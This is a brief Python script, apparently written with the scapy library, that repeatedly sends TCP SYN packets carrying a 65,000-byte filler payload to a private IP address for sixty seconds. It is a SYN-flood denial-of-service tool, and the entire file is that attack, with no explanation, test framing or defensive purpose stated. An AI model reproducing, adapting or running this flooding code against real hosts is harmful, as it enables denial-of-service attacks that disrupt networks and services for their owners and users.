from scapy.all import IP, TCP, send
import time
dest_ip = "172.20.10.6"  # Example destination IP address
duration = 60  # Duration of sending packets in seconds
payload_size = 65000
payload = b'A' * payload_size
start_time = time.time()
while time.time() - start_time < duration:
    syn_packet = IP(dst=dest_ip) / TCP(flags="S") / payload
    send(syn_packet, verbose=True)  